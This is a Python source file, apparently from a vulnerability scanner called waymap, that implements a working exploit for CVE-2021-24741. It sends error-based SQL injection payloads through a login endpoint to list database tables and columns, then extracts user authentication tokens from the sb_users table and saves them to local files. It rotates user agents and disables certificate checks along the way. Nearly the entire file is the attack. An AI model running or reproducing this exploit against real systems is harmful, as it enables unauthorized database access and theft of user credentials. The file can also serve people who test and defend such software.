# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2021-24741

import requests
import random
import os
from colorama import init, Fore
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init()

red = Fore.RED
green = Fore.GREEN
blue = Fore.BLUE
magenta = Fore.MAGENTA
white = Fore.WHITE
reset = Fore.RESET

class exploit:
    def __init__(self):
        self.cookies = {"sb-updates": "3.3.4"}
        self.user_agents = [
            'Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:57.0) Gecko/20100101 Firefox/57.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (iPad; CPU OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C153 Safari/604.1'
        ]
        self.database = []
        self.tables = []
        self.columns = []
        self.tokens = []
        self.divider = "---------------------"

    def save_to_random_file(self):
        # Generate a random filename
        random_filename = f"{random.randint(1000, 9999)}_dump.txt"
        with open(random_filename, "w") as new_file:
            new_file.write("Tables Found on The Database\n")
            for table in self.tables:
                new_file.write(table + "\n")
            new_file.write("\n\nColumns In the Table\n")
            new_file.write(self.divider + "\n")
            new_file.write(self.tables[0] + '\n')
            new_file.write(self.divider + "\n")
            for column in self.columns:
                new_file.write(column + "\n")
        print(green + f"\nData saved to {random_filename}")

    def get_tables(self, profile_url):
        i = 0
        while True:
            headers = {
                "User-Agent": random.choice(self.user_agents),
            }
            data = {
                "function": "login",
                "email": "test\" AND GTID_SUBSET(CONCAT((select table_name from information_schema.tables where table_schema=database() LIMIT {0},1),(SELECT (ELT(9164=9164,0x00))),0x00),9164)-- #".format(i),
                "password": "test",
                "login-cookie": '',
                "language": "false"
            }
            try:
                response = requests.post(profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
                response = response.text
                # Validate the response to avoid false positives
                if "Malformed" in response or "success,false" in response:
                    break
                response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
                response = response.replace('[', '').replace(']', '').replace("'", '').replace('"', '').replace('.', '').replace(' ', '')
                self.tables.append(response)
                i += 1
            except Exception as e:
                print(red + f"Error in get_tables: {e}")
                return False  # Exit this method but continue scanning

    def get_columns(self, profile_url):
        lines = 0
        c = 1
        i = 0
        while lines < len(self.tables):
            while True:
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                }
                data = {
                    "function": "login",
                    "email": "test\" AND GTID_SUBSET(CONCAT((select column_name from information_schema.columns where table_schema=database() LIMIT {0},1),(SELECT (ELT(9164=9164,0x00))),0x00),9164)-- #".format(i),
                    "password": "test",
                    "login-cookie": '',
                    "language": "false"
                }
                try:
                    response = requests.post(profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
                    response = response.text
                    # Validate the response to avoid false positives
                    if "Malformed" in response or "success,false" in response:
                        break
                    response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
                    response = response.replace('[', '').replace(']', '').replace("'", '').replace('"', '').replace('.', '').replace(' ', '')
                    self.columns.append(response)
                    i += 1
                    if response == "id":
                        self.columns.append(self.divider)
                        self.columns.append(self.tables[c])
                        self.columns.append(self.divider)
                        c += 1
                        lines += 1
                except Exception as e:
                    print(red + f"Error in get_columns: {e}")
                    return False  # Exit this method but continue scanning
            break

    def get_tokens(self, profile_url, path):
        final_path = path.replace("admin.php", "include/ajax.php")
        final_profile_url = "{0}{1}".format(profile_url, final_path)
        i = 0
        try:
            headers = {
                "User-Agent": random.choice(self.user_agents),
            }
            data = {
                "function": "login",
                "email": "test\" AND GTID_SUBSET(CONCAT(0x746573747465737474657374,(SELECT (ELT(3469=3469,0x74657374))),database()),3469)-- jXft",
                "password": "test",
                "login-cookie": '',
                "language": "false"
            }
            response = requests.post(final_profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
            response = response.text
            # Validate response to avoid false positives
            if "Malformed" in response or "success,false" in response:
                return
            response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
            response = response.replace('testtesttesttest', '').replace('[', '').replace(']', '').replace("'", '').replace('"', '').replace('.', '').replace(' ', '')
            self.database.append(response)

            while True:
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                }
                data = {
                    "function": "login",
                    "email": 'test\" AND GTID_SUBSET(CONCAT(0x546f6b656e3a2020 ,(SELECT MID((IFNULL(CAST(token AS NCHAR),0x00)),1,190) FROM {0}.sb_users ORDER BY token LIMIT {1},1),0x20),7838)-- #'.format(self.database[0], i),
                    "password": "test",
                    "login-cookie": '',
                    "language": "false"
                }
                response = requests.post(final_profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
                response = response.text
                if "Malformed" in response or "success,false" in response:
                    break
                response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
                response = response.replace('[', '').replace(']', '').replace("'", '').replace('"', '').replace('.', '').replace(' ', '')
                self.tokens.append(response)
                i += 1

            # Save tokens to file
            random_filename = f"tokens_{random.randint(1000, 9999)}.txt"
            with open(random_filename, "w") as new_file:
                new_file.write(self.divider + "\n")
                new_file.write("Tokens Found on The Database\n")
                new_file.write(self.divider + "\n")
                for token in self.tokens:
                    new_file.write(token + "\n")
            print(green + f"\nTokens saved to {random_filename}")
        except Exception as e:
            print(red + f"Error in get_tokens: {e}")
            return False

def scan_cve_2021_24741(target):
    exploiter = exploit()
    exploiter.get_tables(target)
    exploiter.get_columns(target)
    exploiter.get_tokens(target, "admin.php")
    exploiter.save_to_random_file()

